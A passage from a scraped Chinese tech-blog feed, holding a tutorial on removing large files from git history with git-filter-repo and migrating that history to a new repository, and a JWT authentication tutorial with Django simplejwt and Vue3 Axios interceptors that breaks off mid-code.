thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>我这里的情况是原有仓库已经关闭了，就只有手里的项目代码，现在需要将包括带有大文件的历史提交记录 clone到新的仓库中，而且新仓库已有代码和提交记录的情况下。</p>
<p><strong>一个简单快速的方式，使用git filter-repo清理大文件，然后新仓库合并到本地，最后提交</strong></p>
<p>前提：需安装Python 3.10以上版本。使用<strong>git-filter-repo</strong>脚本 而不是安装，临时用更节省时间。 先将项目备份，使用备份进行以下操作，以避免原始仓库被意外损坏。</p>
<p><strong>1.  从git-filter-repo的GitHub页面下载最新版本的git-filter-repo，它是一个单文件的Python脚本。</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2Fgh_mirrors%2Fgi%2Fgit-filter-repo%2Fblob%2Fmain%2Fgit-filter-repo%255D" target="_blank" title="https://gitcode.com/gh_mirrors/gi/git-filter-repo/blob/main/git-filter-repo%5D" ref="nofollow noopener noreferrer"> 直达 git-filter-repo </a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c552ac10d434dedb6dbeba788a4b064~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MzgzNTUxNDI0MDI4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768969985&amp;x-signature=2NQcvNdL0jnG%2F5%2B1kgxLbWngvPQ%3D" alt="image.png" loading="lazy"/></p>
<p><strong>2.  将git-filter-repo放到某个位置，如D:\tool\git-filter-repo并重名为git-filter-repo.py, 第4步需要用到。</strong></p>
<p><strong>3.  先查找大文件，"tail -20"中的20表示条数，使用Git Bash执行</strong></p>
<pre><code class="hljs language-js" lang="js">git rev-list --objects --all | grep <span class="hljs-string">" (git verify-pack -v .git/objects/pack/*.idx | sort -k 3 -n | tail -20 | awk '{print 1}')"</span>
</code></pre>
<p><strong>4.  清理大文件：win+R命令行执行，可查看项目文件夹大小查看是否删除成功</strong></p>
<p>多个文件 就加 --path data/xxx.zip</p>
<pre><code class="hljs language-js" lang="js"> python <span class="hljs-attr">D</span>:\tool\git-filter-repo\git-filter-repo.<span class="hljs-property">py</span> --force --path path/第<span class="hljs-number">3</span>步得到的文件路径.<span class="hljs-property">zip</span> --path data/xxx2.<span class="hljs-property">zip</span> --invert-paths
</code></pre>
<p><strong>5.  查看新的远程仓库是否还在</strong></p>
<pre><code class="hljs language-js" lang="js"> git remote -v
</code></pre>
<p><strong>6.  如果没有进行添加 或修改</strong></p>
<pre><code class="hljs language-js" lang="js">   #添加
   git remote add origin <span class="hljs-title function_">master</span>(你远程的分支)
   
   # 修改
   git remote set-url &lt;远程名称&gt; &lt;新远程仓库<span class="hljs-variable constant_">URL</span>&gt;
</code></pre>
<p><strong>7.  拉取远程代码并允许合并无关历史</strong></p>
<pre><code class="hljs language-js" lang="js"> git pull origin master --allow-unrelated-histories
</code></pre>
<p><strong>8.  解决可能的冲突（如有）</strong></p>
<pre><code class="hljs language-js" lang="js">输入合并信息 <span class="hljs-string">"Merge unrelated histories"</span>
</code></pre>
<p><strong>9.  查看历史记录，是否包含想要提交的历史记录，git Bash here执行，按q退出</strong></p>
<pre><code class="hljs language-js" lang="js">  git log -<span class="hljs-number">50</span>
</code></pre>
<p><strong>10.  推送历史记录并设置跟踪关系</strong></p>
<pre><code class="hljs language-js" lang="js">  git push --set-upstream origin master
</code></pre>
<p>此时已大功告成！你可以去你的git History 中查看是否提交了历史记录。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JWT鉴权的实现：从原理到 Django + Vue3]]></title>    <link>https://juejin.cn/post/7594745643892457507</link>    <guid>https://juejin.cn/post/7594745643892457507</guid>    <pubDate>2026-01-14T05:39:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594745643892457507" data-draft-id="7594739292201369635" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JWT鉴权的实现：从原理到 Django + Vue3"/> <meta itemprop="keywords" content="Django"/> <meta itemprop="datePublished" content="2026-01-14T05:39:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java水解"/> <meta itemprop="url" content="https://juejin.cn/user/2441349519143037"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JWT鉴权的实现：从原理到 Django + Vue3
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2441349519143037/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java水解
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T05:39:01.000Z" title="Wed Jan 14 2026 05:39:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、什么是 JWT？</h2>
<h3 data-id="heading-1"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>1 JWT 的基本概念</h3>
<p>JWT（JSON Web Token）是一种开放标准（RFC 7519），用于在各方之间安全地传输信息。它由三部分组成，用点号（.）分隔：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">Header</span><span class="hljs-selector-class">.Payload</span><span class="hljs-selector-class">.Signature</span>
AI写代码
</code></pre>
<p>一个典型的 JWT 长这样：</p>
<pre><code class="hljs">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6InRlc3R1c2VyIiwiZXhwIjoxNzAwMDAwMDAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
AI写代码
</code></pre>
<h3 data-id="heading-2"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>2 JWT 的三部分详解</h3>
<p><strong>Header（头部）</strong></p>
<p>Header 通常包含两个信息：算法类型和令牌类型。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"alg"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"HS256"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"typ"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"JWT"</span>
<span class="hljs-punctuation">}</span>
AI写代码
</code></pre>
<ul>
<li><code>alg</code>：签名算法，常用 HS256、RS256 等</li>
<li><code>typ</code>：令牌类型，固定为 "JWT"</li>
</ul>
<p>这部分经过 Base64Url 编码后形成第一段。</p>
<p><strong>Payload（负载）</strong></p>
<p>Payload 是实际要传递的数据，也叫声明（Claims）。JWT 有三种类型的声明：</p>

























<table><thead><tr><th>类型</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><strong>标准声明</strong></td><td>JWT 标准预定义的声明</td><td><code>iss</code>（签发者）、<code>exp</code>（过期时间）、<code>sub</code>（主题）</td></tr><tr><td><strong>公共声明</strong></td><td>可以自由使用，但要避免冲突</td><td><code>name</code>、<code>email</code></td></tr><tr><td><strong>私有声明</strong></td><td>双方约定的私有信息</td><td><code>user_id</code>、<code>role</code></td></tr></tbody></table>
<p>一个典型的 Payload：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"user_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"username"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"testuser"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"exp"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1700000000</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"iat"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1699913600</span>
<span class="hljs-punctuation">}</span>
AI写代码
</code></pre>
<p><strong>注意</strong>：Payload 只是 Base64Url 编码，不是加密，所以不要把敏感信息（如密码）放在这里。</p>
<p><strong>Signature（签名）</strong></p>
<p>Signature 是对 Header 和 Payload 的签名，用于验证 JWT 是否被篡改。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">HMACSHA256</span>(
  base64UrlEncode(header) + "." + <span class="hljs-built_in">base64UrlEncode</span>(payload),
  secret
)
AI写代码
</code></pre>
<ul>
<li>前两部分拼接后，用密钥（secret）进行签名</li>
<li>服务器验证时，用同样的密钥重新计算签名，对比是否一致</li>
<li>如果 JWT 被篡改，签名就会对不上</li>
</ul>
<h2 data-id="heading-3"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>二、为什么选择 JWT 而不是 Session？</h2>
<h3 data-id="heading-4"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>1 传统 Session 认证的问题</h3>
<p>在传统的 Web 应用中，<a href="https://link.juejin.cn?target=https%3A%2F%2Fso.csdn.net%2Fso%2Fsearch%3Fq%3D%25E7%2594%25A8%25E6%2588%25B7%25E7%2599%25BB%25E5%25BD%2595%26spm%3D1001.2101.3001.7020" target="_blank" title="https://so.csdn.net/so/search?q=%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95&amp;spm=1001.2101.3001.7020" ref="nofollow noopener noreferrer">用户登录</a>后，服务器会在内存或数据库中创建一个 Session，然后把 Session ID 通过 Cookie 返回给客户端。客户端后续请求会自动带上这个 Cookie，服务器通过 Session ID 找到对应的 Session 数据。</p>
<p>这种方式在单体应用中没问题，但在前后端分离架构下会遇到几个问题：</p>






























<table><thead><tr><th>问题</th><th>Session 方案</th><th>JWT 方案</th></tr></thead><tbody><tr><td><strong>跨域问题</strong></td><td>Cookie 无法跨域，需要额外配置 CORS</td><td>通过 Authorization Header 传递，天然支持跨域</td></tr><tr><td><strong>服务器压力</strong></td><td>每次请求都要查询 Session，服务器压力大</td><td>无状态，服务器不需要存储 Session</td></tr><tr><td><strong>水平扩展</strong></td><td>多台服务器需要共享 Session（Redis）</td><td>每台服务器都能独立验证 Token</td></tr><tr><td><strong>移动端支持</strong></td><td>移动端 Cookie 管理复杂</td><td>Token 存储灵活，LocalStorage、内存都行</td></tr></tbody></table>
<h3 data-id="heading-5"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>2 JWT 的优势</h3>
<ol>
<li><strong>无状态</strong>：服务器不需要存储 Token，减轻服务器压力</li>
<li><strong>跨域友好</strong>：通过 HTTP Header 传递，天然支持跨域</li>
<li><strong>移动端友好</strong>：移动端存储 Token 比管理 Cookie 简单</li>
<li><strong>信息丰富</strong>：Token 本身包含用户信息，减少数据库查询</li>
</ol>
<h3 data-id="heading-6"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>3 JWT 的劣势</h3>
<p>当然，JWT 也不是完美的，也有一些需要注意的地方：</p>
<ol>
<li><strong>无法主动失效</strong>：Token 一旦签发，在过期前无法主动撤销（除非用黑名单）</li>
<li><strong>Token 过大</strong>：如果 Payload 里信息太多，Token 会很长</li>
<li><strong>安全风险</strong>：如果密钥泄露，攻击者可以伪造任意 Token</li>
</ol>
<h2 data-id="heading-7"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>三、Django 后端实现</h2>
<h3 data-id="heading-8"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>1 安装依赖</h3>
<p>首先安装 <code>djangorestframework-simplejwt</code>：</p>
<pre><code class="hljs">pip install djangorestframework-simplejwt
AI写代码
</code></pre>
<h3 data-id="heading-9"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>2 配置 Django Settings</h3>
<p>在 <code>settings.py</code> 中添加配置：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 注册应用</span>
<span class="hljs-attr">INSTALLED_APPS</span> = [
    <span class="hljs-comment"># ... 其他应用</span>
    <span class="hljs-string">'rest_framework_simplejwt'</span>,
]
​
<span class="hljs-comment"># DRF 配置鉴权方式</span>
<span class="hljs-attr">REST_FRAMEWORK</span> = {
    'DEFAULT_AUTHENTICATION_CLASSES': (
        'rest_framework_simplejwt.authentication.JWTAuthentication',
    )
}
​
<span class="hljs-comment"># JWT 配置</span>
<span class="hljs-attr">SIMPLE_JWT</span> = {
    'ACCESS_TOKEN_LIFETIME': datetime.timedelta(<span class="hljs-attr">days</span>=<span class="hljs-number">15</span>),  <span class="hljs-comment"># 访问令牌有效期</span>
    'REFRESH_TOKEN_LIFETIME': datetime.timedelta(<span class="hljs-attr">days</span>=<span class="hljs-number">15</span>),  <span class="hljs-comment"># 刷新令牌有效期</span>
    'USER_ID_FIELD': 'id',
    'USER_ID_CLAIM': 'user_id',
}
AI写代码
</code></pre>
<p><strong>配置说明</strong>：</p>
<ul>
<li><code>ACCESS_TOKEN_LIFETIME</code>：Access Token 的有效期，我设置的是 15 天</li>
<li><code>REFRESH_TOKEN_LIFETIME</code>：Refresh Token 的有效期，用于刷新 Access Token</li>
<li><code>USER_ID_FIELD</code>：用户模型的 ID 字段</li>
<li><code>USER_ID_CLAIM</code>：Token 中存储用户 ID 的字段名</li>
</ul>
<h3 data-id="heading-10"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>3 实现登录接口</h3>
<p>在 <code>user/views.py</code> 中实现登录视图：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> rest_framework.views <span class="hljs-keyword">import</span> APIView
<span class="hljs-keyword">from</span> rest_framework.permissions <span class="hljs-keyword">import</span> AllowAny
<span class="hljs-keyword">from</span> rest_framework_simplejwt.tokens <span class="hljs-keyword">import</span> RefreshToken
<span class="hljs-keyword">from</span> django.contrib.auth.hashers <span class="hljs-keyword">import</span> check_password
<span class="hljs-keyword">from</span> django.http <span class="hljs-keyword">import</span> JsonResponse
<span class="hljs-keyword">import</span> json
​
<span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginView</span>(<span class="hljs-title class_ inherited__">APIView</span>):
    permission_classes = [AllowAny]  <span class="hljs-comment"># 允许任何人登录</span>
​
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">self, request</span>):
        <span class="hljs-keyword">try</span>:
            data = json.loads(request.body)
            username = data.get(<span class="hljs-string">'username'</span>)
            password = data.get(<span class="hljs-string">'password'</span>)
​
            <span class="hljs-comment"># 查询用户</span>
            user = SysUser.objects.get(username=username)
            
            <span class="hljs-comment"># 验证密码</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_password(password, user.password):
                <span class="hljs-keyword">return</span> JsonResponse({<span class="hljs-string">'code'</span>: <span class="hljs-number">500</span>, <span class="hljs-string">'info'</span>: <span class="hljs-string">'用户名或者密码错误！'</span>})
​
            <span class="hljs-comment"># 使用 simplejwt 生成 Token</span>
            refresh = RefreshToken.for_user(user)
            token = <span class="hljs-built_in">str</span>(refresh.access_token)
​
        <span class="hljs-keyword">except</span> SysUser.DoesNotExist:
            <span class="hljs-keyword">return</span> JsonResponse({<span class="hljs-string">'code'</span>: <span class="hljs-number">500</span>, <span class="hljs-string">'info'</span>: <span class="hljs-string">'用户名或者密码错误！'</span>})
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(e)
            <span class="hljs-keyword">return</span> JsonResponse({<span class="hljs-string">'code'</span>: <span class="hljs-number">500</span>, <span class="hljs-string">'info'</span>: <span class="hljs-string">'用户名或者密码错误！'</span>})
​
        <span class="hljs-comment"># 返回 Token</span>
        <span class="hljs-keyword">return</span> JsonResponse({
            <span class="hljs-string">'code'</span>: <span class="hljs-number">200</span>, 
            <span class="hljs-string">'token'</span>: token, 
            <span class="hljs-string">'info'</span>: <span class="hljs-string">'登录成功！'</span>
        })
AI写代码
</code></pre>
<p><strong>代码解析</strong>：</p>
<ol>
<li><code>permission_classes = [AllowAny]</code>：登录接口不需要认证，任何人都可以访问</li>
<li><code>check_password(password, user.password)</code>：Django 提供的密码验证函数，会自动处理密码哈希</li>
<li><code>RefreshToken.for_user(user)</code>：为用户生成 Refresh Token</li>
<li><code>str(refresh.access_token)</code>：从 Refresh Token 中提取 Access Token</li>
<li>返回的 Token 格式：<code>Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</code></li>
</ol>
<h3 data-id="heading-11"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>4 保护需要认证的接口</h3>
<p>对于需要登录才能访问的接口，使用 <code>IsAuthenticated</code> 权限：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> rest_framework.permissions <span class="hljs-keyword">import</span> IsAuthenticated
​
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserInfoView</span>(<span class="hljs-title class_ inherited__">APIView</span>):
    permission_classes = [IsAuthenticated]  <span class="hljs-comment"># 需要认证</span>
​
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self, request</span>):
        user = request.user  <span class="hljs-comment"># JWT 认证后，request.user 就是当前用户</span>
        <span class="hljs-keyword">return</span> JsonResponse({
            <span class="hljs-string">'code'</span>: <span class="hljs-number">200</span>,
            <span class="hljs-string">'data'</span>: {
                <span class="hljs-string">'username'</span>: user.username,
                <span class="hljs-string">'email'</span>: user.email,
            }
        })
AI写代码
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li><code>permission_classes = [IsAuthenticated]</code>：只有携带有效 Token 的请求才能访问</li>
<li><code>request.user</code>：JWT 认证中间件会自动解析 Token，把用户信息注入到 request.user</li>
</ul>
<h2 data-id="heading-12"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>四、Vue3 前端实现</h2>
<h3 data-id="heading-13"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>1 Axios 请求拦截器</h3>
<p>在 <code>src/unit/request.ts</code> 中配置 Axios 拦截器，自动添加 Token：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> axios, { <span class="hljs-keyword">type</span> <span class="hljs-title class_">AxiosError</span>, <span class="hljs-keyword">type</span> <span class="hljs-title class_">AxiosResponse</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>
<span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">"@/router"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ElMessage</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"element-plus"</span>;
​
<span class="hljs-keyword">const</span> httpServer = axios.<span class="hljs-title function_">create</span>({
    <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'http://localhost:8000/'</span>,
    <span class="hljs-attr">timeout</span>: <span class="hljs-number">300000</span>
})
​
<span class="hljs-comment">// 请求拦截器：自动添加 Token</span>
httpServer.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(
    <span class="hljs-function">(<span class="hljs-params">config</span>) =&gt;</span> {
        <span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">window</span>.<span class="hljs-property">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'token'</span>);
        <span class="hljs-keyword">if</span> (token) {
            <span class="hljs-keyword">if</span> (!config.<span class="hljs-property">headers</span>) {
                config.<span class="hljs-property">headers</span> = config.<span class="hljs-property">headers</span> || {}
            }
            <span class="hljs-comment">// 去除 token 中可能存在的空白字符</span>
            <span class="hljs-keyword">const</span> cleanToken = token.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\s+/g</span>, <span class="hljs-string">''</span>);
            <span class="hljs-comment">// 添加 Authorization Header</span>
            config.<span class="hljs-property">headers</span>[<span class="hljs-string">'Authorization'</span>] = <span class="hljs-string">`Bearer <span class="hljs-subst">${cleanToken}</span>`</span>;
        }
        <span class="hljs-keyword">return</span> config;
    },
    <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error)
);
<span class="hljs-variable constant_">AI</span>写代码
</code></pre>
<p><strong>代码解析</strong>：</p>
<ol>
<li>从 <code>localStorage</code> 获取 Token</li>
<li>如果 Token 存在，添加到请求头的 <code>Authorization</code> 字段</li>
<li>格式必须是 <code>Bearer &lt;token&gt;</code>，注意 <code>Bearer</code> 后面有个空格</li>
<li><code>replace(/\s+/g, '')</code>：去除 Token 中的空白字符，防止格式错误</li>
</ol>
<h3 data-id="heading-14"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>2 响应拦截器：处理 Token 过期</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// 响应拦截器：处理错误</span>
httpServer.interceptors.response.use(
  (response: AxiosResponse) =&gt; {
    <span class="hljs-keyword">return</span> response;
  },
  (<span class="hljs-type">error</span>: AxiosError) =&gt; {
    <span class="hljs-keyword">if</span> (<span class="hljs-type">error</span>.response) {
      <span class="hljs-keyword">const</span> status = <span class="hljs-type">error</span>.response.status;
      <span class="hljs-keyword">switch</span> (status) {
        <span class="hljs-keyword">case</span> <span class="hljs-number">401</span>:
          <span class="hljs-comment">// Token 过期或无效</span>
          localStorage.removeItem(<span class="hljs-string">'token'</span>)  <span class="hljs-comment">// 先删除无效 Token</span>
          router.push(<span class="hljs-string">'/login'</span>)              <span class="hljs-comment">// 跳转到登录页</span>
          window.location.reload()            <span class="hljs-comment">// 刷新页面</span>
          ElMessage.<span class="hljs-type">error</span>(<span class="hljs-string">'登录已过期，请重新登录'</span>)
          <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">403</span>:
          <span class="hljs-comment">// 权限不足</span>
